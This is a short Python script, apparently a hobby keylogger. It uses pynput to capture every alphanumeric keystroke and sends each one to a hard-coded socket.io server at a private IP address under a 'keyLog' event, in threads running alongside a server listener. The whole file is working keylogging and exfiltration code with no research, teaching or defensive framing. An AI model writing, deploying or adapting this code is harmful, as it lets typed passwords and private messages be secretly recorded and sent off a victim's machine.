
# DEBUGGER
import logging
logging.getLogger('socketIO-client').setLevel(logging.DEBUG)
logging.basicConfig()

import threading


from socketIO_client_nexus import SocketIO, LoggingNamespace

from pynput import keyboard



# connect with server...
socketIO = SocketIO('10.128.122.101', 3000, LoggingNamespace)




# keyboard events...
def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        socketIO.emit('keyLog', {'key': key.char })

        
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False













def keyboard_list():
    print("keyboard thread started")

    # Collect events until released
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()



def server_list():

    # server events...
    def response(*args):
        print('responseMsg', args)
        
    # TODO: make reconnect 
    def on_reconnect(*args):
        print(args)

    def on_connect():
        print('connect')

    def on_init(*args):
        socketIO.emit('message', {'Hello': 'you again'})
    
    print("server thread started")


    
    #socketIO.emit('message', {'Hello': 'you'})    # wysyla to do serveru message: text
    socketIO.on('init', on_init)
    
    # Listen
    socketIO.on('responseMsg', response)
    socketIO.wait()



server = threading.Thread(name='server_listener', target=server_list)
key = threading.Thread(name='key_listener', target=keyboard_list)

server.start()
key.start()
